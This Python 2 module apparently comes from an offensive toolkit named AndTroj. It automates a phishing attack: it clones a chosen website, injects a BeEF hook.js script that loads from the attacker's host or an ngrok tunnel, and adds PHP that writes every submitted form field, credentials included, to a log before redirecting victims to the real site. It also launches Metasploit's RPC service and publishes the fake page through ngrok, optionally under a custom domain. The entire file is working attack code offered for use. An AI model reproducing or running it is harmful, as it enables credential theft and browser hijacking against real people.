#!/usr/bin/env python
# coding=utf-8
# https://t.me/unk9vvn
# AVI
from core.social_menu import *


LAN = ([l for l in ([ip for ip in socket.gethostbyname_ex(socket.gethostname())[2]
                          if not ip.startswith("127.")][:1], [[(s.connect(('8.8.8.8', 53)),
                          s.getsockname()[0], s.close()) for s in [socket.socket(socket.AF_INET,
                          socket.SOCK_DGRAM)]][0][1]]) if l][0][0])


dir = '/usr/share/AndTroj'
tmp = dir + '/tmp/'
kutation = '"'
bslash1 = '\\'
bslash2 = '\\'
bslash = bslash1 + bslash2
slashkutat = bslash1 + kutation
ng_url = tmp + 'ngrok_url.txt'
out8 = tmp + 'ngrok.txt'
out9 = tmp + 'ngrok_beef.txt'


def harstr():
    global LHOST, NGHOST, LGHOST
    subprocess.call(
        'chmod o+w /var/www/html/',
        shell=True)
    subprocess.call(
        'sed -i \'137s/.*/        enable: true/\' /usr/share/beef-xss/config.yaml && '
        'sed -i \'156s/.*/            enable: true/\' /usr/share/beef-xss/config.yaml',
        shell=True)
    subprocess.call(
        'sed -i \'18s/.*/            host: "' + LAN + '"/\' /usr/share/beef-xss/extensions/metasploit/config.yaml && '
        'sed -i \'28s/.*/            callback_host: "' + LAN + '"/\' /usr/share/beef-xss/extensions/metasploit/config.yaml',
        shell=True)
    NGROK_SLT = raw_input("\n\t[1] Ngrok FreeURL(Free)"
                          "\n\t[2] Ngrok CustomURL(Business)"
                          "\n\nroot@unk9vvn:~# ")
    URL_CLONE = raw_input("\n\t[?] URL CLONE: ")
    if NGROK_SLT == "1":
        LHOST = raw_input("\n\t[i] Use IP Public or DNS NoIP."
                          "\n\t[?] LHOST: ")
        print "\n"
        LGHOST = "0.tcp.ngrok.io"
        subprocess.call(
            'noip2 && proxychains ngrok update',
            shell=True)
        subprocess.call(
            'gnome-terminal --tab -e \'proxychains ngrok http 80\'',
            shell=True)
        pids = [pid for pid in os.listdir('/proc') if pid.isdigit()]
        for pid in pids:
            try:
                cmd = open(os.path.join('/proc', pid, 'cmdline'), 'rb').read()
                if cmd.find('ruby') != -1:
                    print "Kill PID: %s; Command: %s" % (pid, cmd)
                    subprocess.call(
                        'ps -ef | grep ruby | grep -v grep | awk \'{print $2}\' | xargs kill',
                        shell=True)
            except IOError:
                continue
        subprocess.call(
            'sed -i \'45s/.*/        dns_host: "' + LHOST + '"/\' /usr/share/beef-xss/config.yaml && '
            'sed -i \'103s/.*/        db_host: "' + LHOST + '"/\' /usr/share/beef-xss/config.yaml',
            shell=True)
        chek_index = os.path.exists('/var/www/html/index.php')
        if chek_index == (True):
            subprocess.call(
                'rm /var/www/html/index.php',
                shell=True)
        else:
            pass
        subprocess.call(
            'service apache2 start && cd /var/www/html/ && wget -O index.html -c -k -U "Mozilla/5.0 (Macintosh; Intel MacOS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36" "' + URL_CLONE + '"',
            shell=True)
        subprocess.call(
            'sed -i \'s#</body>#\\n<script src="http://' + LHOST + ':3000/hook.js"></script></body>#g\' /var/www/html/index.html',
            shell=True)
        subprocess.call(
            'sed -i "s#</body>#\\n<script>\\n    var commandModuleStr = \'<script src=' + bslash1 + '"\' + window.location.protocol + \'//\' + window.location.host + \'<%= @hook_uri %>' + bslash1 + '" type=' + bslash1 + '"text/javascript' + bslash1 + '"><iIIi/script>\';\\n    document.write(commandModuleStr);\\n</script></body>#g" /var/www/html/index.html',
            shell=True)
        subprocess.call(
            'sed -i -e \'s/\/root\///g\' /var/www/html/index.html',
            shell=True)
        subprocess.call(
            'sed -i -e \'s#iIIi#\\\#g\' /var/www/html/index.html',
            shell=True)
        subprocess.call(
            'mv /var/www/html/index.html /var/www/html/index.php',
            shell=True)
        subprocess.call(
            "sed -i \"1s#.*#<?php\\nif (\$_SERVER['REQUEST_METHOD'] == 'POST') {\\nheader('Location: " + URL_CLONE + "');\\n\$handle = fopen('log.txt', 'a');\\nfwrite(\$handle, '---['.\$_SERVER['SERVER_NAME'].\$_SERVER['SCRIPT_NAME'].']---['.strtoupper(date(" + slashkutat + "h:i:s a - Y/m/d" + slashkutat + ")).']---['.\$_SERVER['REMOTE_ADDR']." + slashkutat + "]" + bslash1 + "\\\\\\r\\\\\\n" + slashkutat + ");\\nforeach(\$_POST as \$variable => \$value) {\\nfwrite(\$handle, \$variable.': '.\$value." + slashkutat + "\\\\\\r\\\\\\n" + slashkutat + ");}\\nfclose(\$handle);\\nexit;\\n} ?>#\" /var/www/html/index.php",
            shell=True)
        subprocess.call(
            'sed -i \'s#action="[^"]*"#action="<?php echo basename(__FILE__); ?>"#g\' /var/www/html/index.php',
            shell=True)
        subprocess.call(
            'gnome-terminal --tab -e \'msfconsole -q -x "load msgrpc ServerHost=' + LAN + ' Pass=abc123"\'',
            shell=True)
        checklog = os.path.exists('/var/www/html/log.txt')
        if checklog == (False):
            subprocess.call(
                'touch /var/www/html/log.txt && chown -R www-data /var/www/html/log.txt  && chgrp -R www-data /var/www/html/log.txt',
                shell=True)
            subprocess.call(
                'gnome-terminal --tab -e \'tail -f /var/www/html/log.txt\'',
                shell=True)
        else:
            subprocess.call(
                'rm /var/www/html/log.txt',
                shell=True)
            subprocess.call(
                'touch /var/www/html/log.txt && chown -R www-data /var/www/html/log.txt  && chgrp -R www-data /var/www/html/log.txt',
                shell=True)
            subprocess.call(
                'gnome-terminal --tab -e \'tail -f /var/www/html/log.txt\'',
                shell=True)
        print "\nI: Please 30 sec waiting...\n"
        time.sleep(15.0)
        subprocess.call(
            'cd /usr/share/beef-xss/ && gnome-terminal --tab -e \'./beef\'',
            shell=True)
        time.sleep(5.0)
        checkng = os.path.exists('/usr/share/AndTroj/tmp/ngrok_url.txt')
        if checkng == (False):
            subprocess.call(
                'FUZ=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE \'s/.*public_url":"([^"]*).*/\\1/p\') && echo "$FUZ" > /usr/share/AndTroj/tmp/ngrok_url.txt',
                shell=True)
        else:
            subprocess.call(
                'rm /usr/share/AndTroj/tmp/ngrok_url.txt',
                shell=True)
            subprocess.call(
                'FUZ=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE \'s/.*public_url":"([^"]*).*/\\1/p\') && echo "$FUZ" > /usr/share/AndTroj/tmp/ngrok_url.txt',
                shell=True)
        fp = open(ng_url, "r")
        URL = fp.read()
        time.sleep(5.0)
        subprocess.call(
            'gnome-terminal --tab -e \'firefox -url ' + URL + ' -new-tab -url http://' + LAN + ':3000/ui/panel\'',
            shell=True)
        print """
             _   _             _       _____                      _      _
        /\  | | | |           | |     / ____|                    | |    | |
       /  \ | |_| |_ __ _  ___| | __ | |     ___  _ __ ___  _ __ | | ___| |_ ___
      / /\ \| __| __/ _` |/ __| |/ / | |    / _ \| '_ ` _ \| '_ \| |/ _ \ __/ _ \
     / ____ \ |_| || (_| | (__|   <  | |___| (_) | | | | | | |_) | |  __/ ||  __/
    /_/    \_\__|\__\__,_|\___|_|\_\  \_____\___/|_| |_| |_| .__/|_|\___|\__\___|
                                                               | |
                                                               |_|
"""
        sys.exit()

    elif NGROK_SLT == "2":
        CUSTM_URL = raw_input("\n\t[i] Example: instagram.com"
                              "\n\t[?] CustomURL: ")
        print "\n"
        subprocess.call(
            'proxychains ngrok update',
            shell=True)
        subprocess.call(
            'gnome-terminal --tab -e \'proxychains ngrok tls -hostname=' + CUSTM_URL + ' 443\'',
            shell=True)
        subprocess.call(
            'gnome-terminal --tab -e \'proxychains ngrok tcp 3000\'',
            shell=True)
        chek_nngk = os.path.exists('/usr/share/AndTroj/tmp/ngrok_beef.txt')
        if chek_nngk == (False):
            pass
        else:
            subprocess.call(
                'rm /usr/share/AndTroj/tmp/ngrok_beef.txt',
                shell=True)
        time.sleep(7.0)
        subprocess.call(
            'FUZ=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE \'s/.*public_url":"tcp:\/\/0.tcp.ngrok.io:([^"]*).*/\\1/p\') && echo "$FUZ" >> /usr/share/AndTroj/tmp/ngrok_beef.txt',
            shell=True)
        NGHOST = "127.0.0.1"
        fs = open(out9)
        length = 5
        LGPORT_BEEF = fs.read(length)
        pids = [pid for pid in os.listdir('/proc') if pid.isdigit()]
        for pid in pids:
            try:
                cmd = open(os.path.join('/proc', pid, 'cmdline'), 'rb').read()
                if cmd.find('ruby') != -1:
                    print "Kill PID: %s; Command: %s" % (pid, cmd)
                    subprocess.call(
                        'ps -ef | grep ruby | grep -v grep | awk \'{print $2}\' | xargs kill',
                        shell=True)
            except IOError:
                continue
        chek_ngk = os.path.exists('/usr/share/AndTroj/tmp/ngrok.txt')
        if chek_ngk == (True):
            subprocess.call(
                'sed -i \'45s/.*/        dns_host: "' + LHOST + '"/\' /usr/share/beef-xss/config.yaml && '
                'sed -i \'103s/.*/        db_host: "' + LHOST + '"/\' /usr/share/beef-xss/config.yaml',
                shell=True)
        else:
            subprocess.call(
                'sed -i \'45s/.*/        dns_host: "' + NGHOST + '"/\' /usr/share/beef-xss/config.yaml && '
                'sed -i \'103s/.*/        db_host: "' + NGHOST + '"/\' /usr/share/beef-xss/config.yaml',
                shell=True)
        chek_index = os.path.exists('/var/www/html/index.php')
        if chek_index == (True):
            subprocess.call(
                'rm /var/www/html/index.php',
                shell=True)
        else:
            pass
        subprocess.call(
            'service apache2 start && cd /var/www/html/ && wget -O index.html -c -k -U "Mozilla/5.0 (Macintosh; Intel MacOS X 10_12_5) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/58.0.3029.110 Safari/537.36" "' + URL_CLONE + '"',
            shell=True)
        subprocess.call(
            'sed -i \'s#</body>#\\n<script src="http://' + LGHOST + ':' + LGPORT_BEEF + '/hook.js"></script></body>#g\' /var/www/html/index.html',
            shell=True)
        subprocess.call(
            'sed -i "s#</body>#\\n<script>\\n    var commandModuleStr = \'<script src=' + bslash1 + '"\' + window.location.protocol + \'//\' + window.location.host + \'<%= @hook_uri %>' + bslash1 + '" type=' + bslash1 + '"text/javascript' + bslash1 + '"><iIIi/script>\';\\n    document.write(commandModuleStr);\\n</script></body>#g" /var/www/html/index.html',
            shell=True)
        subprocess.call(
            'sed -i -e \'s/\/root\///g\' /var/www/html/index.html',
            shell=True)
        subprocess.call(
            'sed -i -e \'s#iIIi#\\\#g\' /var/www/html/index.html',
            shell=True)
        subprocess.call(
            'mv /var/www/html/index.html /var/www/html/index.php',
            shell=True)
        subprocess.call(
            "sed -i \"1s#.*#<?php\\nif (\$_SERVER['REQUEST_METHOD'] == 'POST') {\\nheader('Location: " + URL_CLONE + "');\\n\$handle = fopen('log.txt', 'a');\\nfwrite(\$handle, '---['.\$_SERVER['SERVER_NAME'].\$_SERVER['SCRIPT_NAME'].']---['.strtoupper(date(" + slashkutat + "h:i:s a - Y/m/d" + slashkutat + ")).']---['.\$_SERVER['REMOTE_ADDR']." + slashkutat + "]" + bslash1 + "\\\\\\r\\\\\\n" + slashkutat + ");\\nforeach(\$_POST as \$variable => \$value) {\\nfwrite(\$handle, \$variable.': '.\$value." + slashkutat + "\\\\\\r\\\\\\n" + slashkutat + ");}\\nfclose(\$handle);\\nexit;\\n} ?>#\" /var/www/html/index.php",
            shell=True)
        subprocess.call(
            'sed -i \'s#action="[^"]*"#action="<?php echo basename(__FILE__); ?>"#g\' /var/www/html/index.php',
            shell=True)
        subprocess.call(
            'gnome-terminal --tab -e \'msfconsole -q -x "load msgrpc ServerHost=' + LAN + ' Pass=abc123"\'',
            shell=True)
        checklog = os.path.exists('/var/www/html/log.txt')
        if checklog == (False):
            subprocess.call(
                'touch /var/www/html/log.txt && chown -R www-data /var/www/html/log.txt  && chgrp -R www-data /var/www/html/log.txt',
                shell=True)
            subprocess.call(
                'gnome-terminal --tab -e \'tail -f /var/www/html/log.txt\'',
                shell=True)
        else:
            subprocess.call(
                'rm /var/www/html/log.txt',
                shell=True)
            subprocess.call(
                'touch /var/www/html/log.txt && chown -R www-data /var/www/html/log.txt  && chgrp -R www-data /var/www/html/log.txt',
                shell=True)
            subprocess.call(
                'gnome-terminal --tab -e \'tail -f /var/www/html/log.txt\'',
                shell=True)
        print "\nI: Please 30 sec waiting...\n"
        time.sleep(15.0)
        subprocess.call(
            'cd /usr/share/beef-xss/ && gnome-terminal --tab -e \'./beef\'',
            shell=True)
        time.sleep(5.0)
        checkng = os.path.exists('/usr/share/AndTroj/tmp/ngrok_url.txt')
        if checkng == (False):
            subprocess.call(
                'FUZ=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE \'s/.*public_url":"([^"]*).*/\\1/p\') && echo "$FUZ" > /usr/share/AndTroj/tmp/ngrok_url.txt',
                shell=True)
        else:
            subprocess.call(
                'rm /usr/share/AndTroj/tmp/ngrok_url.txt',
                shell=True)
            subprocess.call(
                'FUZ=$(curl --silent --show-error http://127.0.0.1:4040/api/tunnels | sed -nE \'s/.*public_url":"([^"]*).*/\\1/p\') && echo "$FUZ" > /usr/share/AndTroj/tmp/ngrok_url.txt',
                shell=True)
        fp = open(ng_url, "r")
        URL = fp.read()
        time.sleep(5.0)
        subprocess.call(
            'gnome-terminal --tab -e \'firefox -url ' + URL + ' -new-tab -url http://' + LAN + ':3000/ui/panel\'',
            shell=True)
        print """
             _   _             _       _____                      _      _
        /\  | | | |           | |     / ____|                    | |    | |
       /  \ | |_| |_ __ _  ___| | __ | |     ___  _ __ ___  _ __ | | ___| |_ ___
      / /\ \| __| __/ _` |/ __| |/ / | |    / _ \| '_ ` _ \| '_ \| |/ _ \ __/ _ \
     / ____ \ |_| || (_| | (__|   <  | |___| (_) | | | | | | |_) | |  __/ ||  __/
    /_/    \_\__|\__\__,_|\___|_|\_\  \_____\___/|_| |_| |_| .__/|_|\___|\__\___|
                                                               | |
                                                               |_|
"""
        sys.exit()
    else:
        return NGROK_SLT
